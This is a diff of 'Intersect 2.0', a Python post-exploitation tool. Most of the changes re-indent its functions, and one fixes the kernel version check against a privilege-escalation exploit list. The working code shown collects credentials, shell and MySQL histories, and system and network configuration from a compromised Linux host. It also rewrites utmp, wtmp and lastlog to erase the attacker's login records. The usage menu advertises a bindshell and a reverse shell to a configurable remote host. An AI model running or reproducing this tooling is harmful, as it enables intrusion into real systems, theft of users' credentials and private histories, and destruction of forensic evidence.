@@ -57,187 +57,176 @@ except ImportError:
 
 def usage():
     
-   __version__ = "revision 2.2.1"
-   __author__ = "ohdae"
-   __website__ = "http://bindshell.it.cx"
+    __version__ = "revision 2.2.1"
+    __author__ = "ohdae"
+    __website__ = "http://bindshell.it.cx"
    
-   print("=====================================================")                                                                    
-   print("       intersect 2.0 | automated post-exploitation")
-   print("                "+__version__+"                ")
-   print("               "+__author__+" | "+__website__)
-   print("=====================================================")
-   print("\nFeatures:")
-   print("  -d --daemon         run Intersect as a background process")
-   print("  -o --os-info        os/distro, users, devices, cronjobs, installed apps, etc")
-   print("  -n --network        detailed network info")
-   print("  -l --live-hosts     find live hosts on network")
-   print("  -c --credentials    locate and save user/system credentials")
-   print("  -e --extras         locate installed AV/FW, configs and extras")
-   print("  -a --all-tests      run all local tests and tar reports *scapy required")
-   print("  -t --tar            make archive of final reports")
-   print("  -s --scrub          scrubs current user/ip from utmp, wtmp & lastlog")
-   print("  -b --bind           opens bindshell on port 443")
-   print("  -r --reverse        opens reverse shell *change RHOST in config")  
-   print("  -h --help           prints this menu")
-   print("usage: ./intersect.py --daemon --network --extras")
-   print("       ./intersect.py --all-tests\n")
+    print("=====================================================")                                                                    
+    print("       intersect 2.0 | automated post-exploitation")
+    print("                "+__version__+"                ")
+    print("               "+__author__+" | "+__website__)
+    print("=====================================================")
+    print("\nFeatures:")
+    print("  -d --daemon         run Intersect as a background process")
+    print("  -o --os-info        os/distro, users, devices, cronjobs, installed apps, etc")
+    print("  -n --network        detailed network info")
+    print("  -l --live-hosts     find live hosts on network")
+    print("  -c --credentials    locate and save user/system credentials")
+    print("  -e --extras         locate installed AV/FW, configs and extras")
+    print("  -a --all-tests      run all local tests and tar reports *scapy required")
+    print("  -t --tar            make archive of final reports")
+    print("  -s --scrub          scrubs current user/ip from utmp, wtmp & lastlog")
+    print("  -b --bind           opens bindshell on port 443")
+    print("  -r --reverse        opens reverse shell *change RHOST in config")  
+    print("  -h --help           prints this menu")
+    print("usage: ./intersect.py --daemon --network --extras")
+    print("       ./intersect.py --all-tests\n")
 
 def environment():
-   global Home_Dir
-   global Temp_Dir
-   global Config_Dir
-   global User_Ip_Address
-   global UTMP_STRUCT_SIZE    
-   global LASTLOG_STRUCT_SIZE
-   global UTMP_FILEPATH      
-   global WTMP_FILEPATH       
-   global LASTLOG_FILEPATH
-   global RHOST
-   global RPORT
-   global pkey
-   global distro
-   global distro2
-   global kernel_version_string
+    global Home_Dir
+    global Temp_Dir
+    global Config_Dir
+    global User_Ip_Address
+    global UTMP_STRUCT_SIZE    
+    global LASTLOG_STRUCT_SIZE
+    global UTMP_FILEPATH      
+    global WTMP_FILEPATH       
+    global LASTLOG_FILEPATH
+    global RHOST
+    global RPORT
+    global pkey
+    global distro
+    global distro2
 
-   # Change RHOST & RPORT accordingly if you're going to use the reverse shell   
-   RHOST = '127.0.0.1'
-   RPORT = 443
-   pkey = 'XKIUKX'
+    # Change RHOST & RPORT accordingly if you're going to use the reverse shell   
+    RHOST = '127.0.0.1'
+    RPORT = 443
+    pkey = 'XKIUKX'
 
-   kernel_version_string = os.popen('uname -r').read().strip()
-   distro = os.uname()[1]
-   distro2 = platform.linux_distribution()[0]
+    distro = os.uname()[1]
+    distro2 = platform.linux_distribution()[0]
  
-   if os.geteuid() != 0:
+    if os.geteuid() != 0:
         print("[*] This script *must* be executed as root. If not, there will be errors and/or crashes.")
-        print("[*] Intersect will now check this kernel for possible privilege escalation exploits.\n     We will find your kernel version and display a list of exploits for that kernel, if available.")
+        print("[*] Intersect will now check this kernel for possible privilege escalation exploits.\n")
         exploitCheck()
         sys.exit()
-   else:
-        pass
+    else:
+         pass
 
-   Home_Dir = os.environ['HOME']
-   User_Ip_Address = socket.gethostbyname(socket.gethostname())
+    Home_Dir = os.environ['HOME']
+    User_Ip_Address = socket.gethostbyname(socket.gethostname())
     
-   Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
-   Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
-   Config_Dir = Temp_Dir+"/configs/"
+    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
+    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
+    Config_Dir = Temp_Dir+"/configs/"
    
 
-   signal.signal(signal.SIGINT, signalHandler)
+    signal.signal(signal.SIGINT, signalHandler)
     
-   # Tested on Linux ubuntu 3.0.0-12-generic #20-Ubuntu
-   UTMP_STRUCT_SIZE    = 384
-   LASTLOG_STRUCT_SIZE = 292
-   UTMP_FILEPATH       = "/var/run/utmp"
-   WTMP_FILEPATH       = "/var/log/wtmp"
-   LASTLOG_FILEPATH    = "/var/log/lastlog"
+    # Tested on Linux ubuntu 3.0.0-12-generic #20-Ubuntu
+    UTMP_STRUCT_SIZE    = 384
+    LASTLOG_STRUCT_SIZE = 292
+    UTMP_FILEPATH       = "/var/run/utmp"
+    WTMP_FILEPATH       = "/var/log/wtmp"
+    LASTLOG_FILEPATH    = "/var/log/lastlog"
    
-   os.system("clear")
+    os.system("clear")
 
-   print("[+] Creating temporary working environment....")
-   os.chdir(Home_Dir)
-   if os.path.exists(Temp_Dir) is True:
-       os.system("rm -rf "+Temp_Dir)
-   if os.path.exists(Temp_Dir) is False:
-       os.mkdir(Temp_Dir)
+    print("[+] Creating temporary working environment....")
+    os.chdir(Home_Dir)
+    if os.path.exists(Temp_Dir) is True:
+        os.system("rm -rf "+Temp_Dir)
+    if os.path.exists(Temp_Dir) is False:
+        os.mkdir(Temp_Dir)
 
-   print "[!] Reports will be saved in: %s" % Temp_Dir
-
-
-def xor(string, key):
-    data = ''
-    for char in string:
-        for ch in key:
-            char = chr(ord(char) ^ ord(ch))
-        data += char
-    return data
+    print "[!] Reports will be saved in: %s" % Temp_Dir
 
   
 def signalHandler(signal, frame):
-  print("[!] Ctrl-C caught, shutting down now");
-  Shutdown()
+    print("[!] Ctrl-C caught, shutting down now");
+    Shutdown()
 
   
 def Shutdown():
-  if not os.listdir(Temp_Dir):
-    os.rmdir(Temp_Dir)
+    if not os.listdir(Temp_Dir):
+        os.rmdir(Temp_Dir)
 
 
 def Gather_OS():
-   print("[+] Collecting operating system and user information....")
-   os.mkdir(Temp_Dir+"/osinfo/")
-   os.chdir(Temp_Dir+"/osinfo/")
+    print("[+] Collecting operating system and user information....")
+    os.mkdir(Temp_Dir+"/osinfo/")
+    os.chdir(Temp_Dir+"/osinfo/")
    
-   proc = Popen('ps aux',
-                shell=True, 
-                stdout=PIPE,
-                )
-   output = proc.communicate()[0]
-   file = open("ps_aux.txt","a")
-   for items in output:
-       file.write(items),
-   file.close()
+    proc = Popen('ps aux',
+                 shell=True, 
+                 stdout=PIPE,
+                 )
+    output = proc.communicate()[0]
+    file = open("ps_aux.txt","a")
+    for items in output:
+        file.write(items),
+    file.close()
 
-   os.system("ls -alh /usr/bin > bin.txt")
-   os.system("ls -alh /usr/sbin > sbin.txt")
-   os.system("ls -al /etc/cron* > cronjobs.txt")
-   os.system("ls -alhtr /media > media.txt")
+    os.system("ls -alh /usr/bin > bin.txt")
+    os.system("ls -alh /usr/sbin > sbin.txt")
+    os.system("ls -al /etc/cron* > cronjobs.txt")
+    os.system("ls -alhtr /media > media.txt")
 
-   if distro == "ubuntu" or distro2 == "Ubuntu":
-      os.system("dpkg -l > dpkg_list.txt")
-   elif distro == "arch" or distro2 == "Arch":
-      os.system("pacman -Q > pacman_list.txt")
-   elif distro == "slackware" or distro2 == "Slackware":
-      os.system("ls /var/log/packages > packages_list.txt")
-   elif distro == "gentoo" or distro2 == "Gentoo":
-      os.system("cat /var/lib/portage/world > packages.txt")
-   elif distro == "centos" or distro2 == "CentOS":
-      os.system("yum list installed > yum_list.txt")
-   elif distro == "red hat" or distro2 == "Red Hat":
-      os.system("rpm -qa > rpm_list.txt")
-   else:
-      pass
+    if distro == "ubuntu" or distro2 == "Ubuntu":
+        os.system("dpkg -l > dpkg_list.txt")
+    elif distro == "arch" or distro2 == "Arch":
+        os.system("pacman -Q > pacman_list.txt")
+    elif distro == "slackware" or distro2 == "Slackware":
+        os.system("ls /var/log/packages > packages_list.txt")
+    elif distro == "gentoo" or distro2 == "Gentoo":
+        os.system("cat /var/lib/portage/world > packages.txt")
+    elif distro == "centos" or distro2 == "CentOS":
+        os.system("yum list installed > yum_list.txt")
+    elif distro == "red hat" or distro2 == "Red Hat":
+        os.system("rpm -qa > rpm_list.txt")
+    else:
+       pass
    
-   if distro == "arch":
-      os.system("egrep '^DAEMONS' /etc/rc.conf > services_list.txt")
-   elif distro == "slackware":
-      os.system("ls -F /etc/rc.d | grep \'*$\' > services_list.txt")
-   elif whereis('chkconfig') is not None:
-      os.system("chkconfig -A > services_list.txt")
+    if distro == "arch":
+        os.system("egrep '^DAEMONS' /etc/rc.conf > services_list.txt")
+    elif distro == "slackware":
+        os.system("ls -F /etc/rc.d | grep \'*$\' > services_list.txt")
+    elif whereis('chkconfig') is not None:
+        os.system("chkconfig -A > services_list.txt")
 
-   os.system("mount -l > mount.txt")
-   os.system("cat /etc/sysctl.conf > sysctl.txt")
-   os.system("find /var/log -type f -exec ls -la {} \; > loglist.txt")
-   os.system("uname -a > distro_kernel.txt")
-   os.system("df -hT > filesystem.txt")
-   os.system("free -lt > memory.txt")
-   os.system("locate sql | grep [.]sql$ > SQL_locations.txt")
-   os.system("find /home -type f -iname '.*history' > HistoryList.txt")
-   os.system("cat /proc/cpuinfo > cpuinfo.txt")
-   os.system("cat /proc/meminfo > meminfo.txt")
+    os.system("mount -l > mount.txt")
+    os.system("cat /etc/sysctl.conf > sysctl.txt")
+    os.system("find /var/log -type f -exec ls -la {} \; > loglist.txt")
+    os.system("uname -a > distro_kernel.txt")
+    os.system("df -hT > filesystem.txt")
+    os.system("free -lt > memory.txt")
+    os.system("locate sql | grep [.]sql$ > SQL_locations.txt")
+    os.system("find /home -type f -iname '.*history' > HistoryList.txt")
+    os.system("cat /proc/cpuinfo > cpuinfo.txt")
+    os.system("cat /proc/meminfo > meminfo.txt")
 
-   if os.path.exists(Home_Dir+"/.bash_history") is True:
+    if os.path.exists(Home_Dir+"/.bash_history") is True:
         shutil.copy2(Home_Dir+"/.bash_history", "bash_history.txt")
-   if os.path.exists(Home_Dir+"/.viminfo") is True:
-       shutil.copy2(Home_Dir+"/.viminfo", "viminfo")
-   if os.path.exists(Home_Dir+"/.mysql_history") is True:
-       shutil.copy2(Home_Dir+"/.mysql_history", "mysql_history")
+    if os.path.exists(Home_Dir+"/.viminfo") is True:
+        shutil.copy2(Home_Dir+"/.viminfo", "viminfo")
+    if os.path.exists(Home_Dir+"/.mysql_history") is True:
+        shutil.copy2(Home_Dir+"/.mysql_history", "mysql_history")
    
-   sysfiles = ["distro_kernel.txt","filesystem.txt","memory.txt","cpuinfo.txt","meminfo.txt"]
-   content = ''
-   for f in sysfiles:
-       content = content + '\n' + open(f).read()
-   open('SysInfo.txt','wb').write(content)
-   os.system("rm distro_kernel.txt filesystem.txt memory.txt cpuinfo.txt meminfo.txt")
+    sysfiles = ["distro_kernel.txt","filesystem.txt","memory.txt","cpuinfo.txt","meminfo.txt"]
+    content = ''
+    for f in sysfiles:
+        content = content + '\n' + open(f).read()
+    open('SysInfo.txt','wb').write(content)
+    os.system("rm distro_kernel.txt filesystem.txt memory.txt cpuinfo.txt meminfo.txt")
    
-   os.mkdir("users/")
-   os.chdir("users/")
+    os.mkdir("users/")
+    os.chdir("users/")
    
-   os.system("ls -alhR ~/ > CurrentUser.txt")
-   os.system("ls -alhR /home > AllUsers.txt")
-   if os.path.exists(Home_Dir+"/.mozilla/") is True:
-       os.system("find "+Home_Dir+"/.mozilla -name bookmarks*.json > UsersBookmarks.txt")
+    os.system("ls -alhR ~/ > CurrentUser.txt")
+    os.system("ls -alhR /home > AllUsers.txt")
+    if os.path.exists(Home_Dir+"/.mozilla/") is True:
+        os.system("find "+Home_Dir+"/.mozilla -name bookmarks*.json > UsersBookmarks.txt")
 
    
 def GetCredentials():
@@ -316,74 +305,74 @@ def GetCredentials():
             
 
 def NetworkInfo():
-   print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
-   os.mkdir(Temp_Dir+"/network")
-   networkdir = (Temp_Dir+"/network")
-   os.chdir(networkdir) 
+    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
+    os.mkdir(Temp_Dir+"/network")
+    networkdir = (Temp_Dir+"/network")
+    os.chdir(networkdir) 
 
-   proc = Popen('netstat --tcp --listening',
-        shell=True,
-        stdout=PIPE,
-        )
-   output = proc.communicate()[0]
+    proc = Popen('netstat --tcp --listening',
+         shell=True,
+         stdout=PIPE,
+         )
+    output = proc.communicate()[0]
 
-   file = open("nstat.txt","a")
-   for items in output:
-       file.write(items),
-   file.close() 
+    file = open("nstat.txt","a")
+    for items in output:
+        file.write(items),
+    file.close() 
 
-   os.system("lsof -nPi > lsof.txt")
-   ports = ["nstat.txt","lsof.txt"]
-   content = ''
-   for f in ports:
-       content = content + '\n' + open(f).read()
-   open('Connections.txt','wb').write(content)
-   os.system("rm nstat.txt lsof.txt")
-   if whereis('iptables') is not None:
-       os.system("iptables -L -n > iptablesLN.txt") 
-       os.system("iptables-save > iptables_save.txt")
-   else:
-       pass
+    os.system("lsof -nPi > lsof.txt")
+    ports = ["nstat.txt","lsof.txt"]
+    content = ''
+    for f in ports:
+        content = content + '\n' + open(f).read()
+    open('Connections.txt','wb').write(content)
+    os.system("rm nstat.txt lsof.txt")
+    if whereis('iptables') is not None:
+        os.system("iptables -L -n > iptablesLN.txt") 
+        os.system("iptables-save > iptables_save.txt")
+    else:
+        pass
 
-   os.system("ifconfig -a > ifconfig.txt")
+    os.system("ifconfig -a > ifconfig.txt")
 
 
-   if distro == "ubuntu" or distro2 == "Ubuntu" is True:
-       os.system("hostname -I > IPAddresses.txt")
-   else:
-       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-       s.connect(("google.com",80))
-       localIP = (s.getsockname()[0])
-       s.close()
-       splitIP = localIP.split('.')
-       splitIP[3:] = (['0/24'])
-       IPRange = ".".join(splitIP)
-       externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
-       file = open("IPAddresses.txt", "a")
-       file.write("External IP Address: " + externalIP)
-       file.write("Internal IP Address: " + localIP)
-       file.write("Internal IP Range: " + IPRange)
-       file.close
+    if distro == "ubuntu" or distro2 == "Ubuntu" is True:
+        os.system("hostname -I > IPAddresses.txt")
+    else:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("google.com",80))
+        localIP = (s.getsockname()[0])
+        s.close()
+        splitIP = localIP.split('.')
+        splitIP[3:] = (['0/24'])
+        IPRange = ".".join(splitIP)
+        externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
+        file = open("IPAddresses.txt", "a")
+        file.write("External IP Address: " + externalIP)
+        file.write("Internal IP Address: " + localIP)
+        file.write("Internal IP Range: " + IPRange)
+        file.close
    
-   os.system("hostname -f > hostname.txt")
+    os.system("hostname -f > hostname.txt")
    
-   netfiles = ["IPAddresses.txt","hostname.txt","ifconfig.txt"]
-   content = ''
-   for f in netfiles:
-       content = content + '\n' + open(f).read()
-   open('NetworkInfo.txt','wb').write(content)
-   os.system("rm IPAddresses.txt hostname.txt ifconfig.txt")
+    netfiles = ["IPAddresses.txt","hostname.txt","ifconfig.txt"]
+    content = ''
+    for f in netfiles:
+        content = content + '\n' + open(f).read()
+    open('NetworkInfo.txt','wb').write(content)
+    os.system("rm IPAddresses.txt hostname.txt ifconfig.txt")
 
-   network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
-   for x in network:
-       if os.path.exists(x) is True:
-           shutil.copy2(x, networkdir)
+    network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
+    for x in network:
+        if os.path.exists(x) is True:
+            shutil.copy2(x, networkdir)
    
                
 def NetworkMap():
-   # Combine ARP then portscan. Send IPs to list and iterate through for the scan
-   # Add service identification via socket for all open ports
-   # Add traceroute after finding live hosts. Send all results to graph report.
+    # Combine ARP then portscan. Send IPs to list and iterate through for the scan
+    # Add service identification via socket for all open ports
+    # Add traceroute after finding live hosts. Send all results to graph report.
    
     print("[+] Searching for live hosts...")
     os.mkdir(Temp_Dir+"/hosts")
@@ -519,59 +508,59 @@ def FindExtras():
 
 
 def ScrubLog():  
-  try:
-    Current_User = os.getlogin()
-  except OSError:
-    print "[!] Cannot find user in logs. Did you all ready run --scrub ?"
-    return
+    try:
+      Current_User = os.getlogin()
+    except OSError:
+      print "[!] Cannot find user in logs. Did you all ready run --scrub ?"
+      return
     
-  newUtmp = scrubFile(UTMP_FILEPATH, Current_User)
-  writeNewFile(UTMP_FILEPATH, newUtmp)
-  print "[+] %s cleaned" % UTMP_FILEPATH
-  
-  newWtmp = scrubFile(WTMP_FILEPATH, Current_User)
-  writeNewFile(WTMP_FILEPATH, newWtmp)
-  print "[+] %s cleaned" % WTMP_FILEPATH
+    newUtmp = scrubFile(UTMP_FILEPATH, Current_User)
+    writeNewFile(UTMP_FILEPATH, newUtmp)
+    print "[+] %s cleaned" % UTMP_FILEPATH
+	  
+    newWtmp = scrubFile(WTMP_FILEPATH, Current_User)
+    writeNewFile(WTMP_FILEPATH, newWtmp)
+    print "[+] %s cleaned" % WTMP_FILEPATH
 
-  newLastlog = scrubLastlogFile(LASTLOG_FILEPATH, Current_User)
-  writeNewFile(LASTLOG_FILEPATH, newLastlog)
-  print "[+] %s cleaned" % LASTLOG_FILEPATH
+    newLastlog = scrubLastlogFile(LASTLOG_FILEPATH, Current_User)
+    writeNewFile(LASTLOG_FILEPATH, newLastlog)
+    print "[+] %s cleaned" % LASTLOG_FILEPATH
 
 
 def scrubFile(filePath, Current_User):
-  newUtmp = ""
-  with open(filePath, "rb") as f:
-    bytes = f.read(UTMP_STRUCT_SIZE)
-    while bytes != "":
-      data = struct.unpack("hi32s4s32s256shhiii36x", bytes)
-      if cut(data[4]) != Current_User and cut(data[5]) != User_Ip_Address:
-	newUtmp += bytes
+    newUtmp = ""
+    with open(filePath, "rb") as f:
       bytes = f.read(UTMP_STRUCT_SIZE)
-  f.close()
-  return newUtmp
+      while bytes != "":
+        data = struct.unpack("hi32s4s32s256shhiii36x", bytes)
+        if cut(data[4]) != Current_User and cut(data[5]) != User_Ip_Address:
+	  newUtmp += bytes
+        bytes = f.read(UTMP_STRUCT_SIZE)
+    f.close()
+    return newUtmp
 
 
 def scrubLastlogFile(filePath, Current_User):
-  pw  	     = pwd.getpwnam(Current_User)
-  uid	     = pw.pw_uid
-  idCount    = 0
-  newLastlog = ''
+    pw  	     = pwd.getpwnam(Current_User)
+    uid	       = pw.pw_uid
+    idCount    = 0
+    newLastlog = ''
   
-  with open(filePath, "rb") as f:
-    bytes = f.read(LASTLOG_STRUCT_SIZE)
-    while bytes != "":
-      data = struct.unpack("hh32s256s", bytes)
-      if (idCount != uid):
-	newLastlog += bytes
-      idCount += 1
+    with open(filePath, "rb") as f:
       bytes = f.read(LASTLOG_STRUCT_SIZE)
-  return newLastlog
+      while bytes != "":
+        data = struct.unpack("hh32s256s", bytes)
+        if (idCount != uid):
+	  newLastlog += bytes
+        idCount += 1
+        bytes = f.read(LASTLOG_STRUCT_SIZE)
+    return newLastlog
 
 
 def writeNewFile(filePath, fileContents):
-  f = open(filePath, "w+b")
-  f.write(fileContents)
-  f.close()
+    f = open(filePath, "w+b")
+    f.write(fileContents)
+    f.close()
   
 
 def fix_version(version):
@@ -587,6 +576,8 @@ def fix_version(version):
 def exploitCheck():
     # Shout out to Bernardo Damele for letting me use this code! Thanks again!
     # Check out his blog at http://bernardodamele.blogspot.com
+
+    kernel_version_string = os.popen('uname -r').read().strip()
 
     exploitdb_url = "http://www.exploit-db.com/exploits"
     enlightenment_url = "http://www.grsecurity.net/~spender/enlightenment.tgz"
@@ -645,7 +636,7 @@ def exploitCheck():
             else:
                 min_version, max_version = version_tree, version_tree
 
-            if kernel_version >= min_version and kernel_version <= max_version:
+            if kernel_version >= fix_version(min_version) and kernel_version <= fix_version(max_version):
                 cve = data["CVE"]
                 exploits = data["exploits"]
                 found_exploit = True
